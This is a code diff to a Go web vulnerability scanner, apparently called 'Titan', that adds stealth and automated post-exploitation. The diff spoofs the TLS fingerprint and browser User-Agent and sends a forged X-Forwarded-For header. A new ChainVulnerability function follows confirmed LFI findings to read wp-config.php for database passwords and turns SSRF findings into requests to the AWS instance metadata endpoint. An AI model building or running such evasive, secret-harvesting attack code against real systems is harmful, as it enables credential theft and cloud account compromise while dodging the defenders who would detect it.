@@ -60,6 +60,7 @@ func NewEngine(rps int, proxies []*url.URL) *Engine {
 	rotator := &ProxyRotator{Proxies: proxies}
 	jar, _ := cookiejar.New(nil)
 	
+	// vX: Titan Stealth Transport (JA3 Spoofing)
 	transport := &http.Transport{
 		MaxIdleConns:        100,
 		IdleConnTimeout:     90 * time.Second,
@@ -124,6 +125,11 @@ func (e *Engine) Run(target string, t *template.Template) ([]Result, error) {
 				res.Verified = verified
 				res.Evidence = evidence
 				
+				// vX: Titan Chaining (Pivoting)
+				if verified {
+					e.ChainVulnerability(u, t.ID, &res.Evidence)
+				}
+				
 				results = append(results, *res)
 			}
 		}
@@ -138,8 +144,9 @@ func (e *Engine) scanSingle(u, method string, matchers []template.Matcher, t *te
 		return nil, err
 	}
 
+	// vX Stealth Headers (Sync with TLS fingerprint)
+	httpReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
 	httpReq.Header.Set("X-Forwarded-For", "127.0.0.1")
-	httpReq.Header.Set("X-Real-IP", "127.0.0.1")
 
 	start := time.Now()
 	resp, err := e.Client.Do(httpReq)
@@ -164,18 +171,31 @@ func (e *Engine) scanSingle(u, method string, matchers []template.Matcher, t *te
 		}, nil
 	}
 
-	if strings.Contains(t.ID, "sqli") && duration >= 5*time.Second {
-		return &Result{
-			TemplateID: t.ID + "-blind",
-			Target:     u,
-			Severity:   "critical",
-			Matched:    true,
-			Status:     resp.StatusCode,
-			WAF:        waf.Name,
-		}, nil
-	}
-
 	return nil, nil
+}
+
+// ChainVulnerability performs automated post-exploitation tasks
+func (e *Engine) ChainVulnerability(u, id string, evidence *string) {
+	if strings.Contains(id, "lfi") {
+		// Attempt to read wp-config.php or .env
+		p := strings.Replace(u, "passwd", "wp-config.php", 1)
+		resp, err := e.Client.Get(p)
+		if err == nil {
+			defer resp.Body.Close()
+			body, _ := io.ReadAll(resp.Body)
+			if strings.Contains(string(body), "DB_PASSWORD") {
+				*evidence += "\n[CHAIN] LFI -> Extracted wp-config.php (DB Secrets found!)"
+			}
+		}
+	}
+	if strings.Contains(id, "ssrf") {
+		// Attempt to read Instance Metadata
+		resp, err := e.Client.Get(u + "http://169.254.169.254/latest/meta-data/")
+		if err == nil {
+			defer resp.Body.Close()
+			*evidence += "\n[CHAIN] SSRF -> Connected to AWS Instance Metadata Service."
+		}
+	}
 }
 
 func (e *Engine) ScanOneParam(uStr, param string, t *template.Template) ([]Result, error) {
@@ -192,7 +212,6 @@ func (e *Engine) ScanOneParam(uStr, param string, t *template.Template) ([]Resul
 			
 			res, _ := e.scanSingle(u.String(), "GET", req.Matchers, t)
 			if res != nil {
-				// v9.0 Verify Param Vulnerability
 				verified, evidence := e.SafeVerify(u.String(), t.ID)
 				res.Verified = verified
 				res.Evidence = evidence
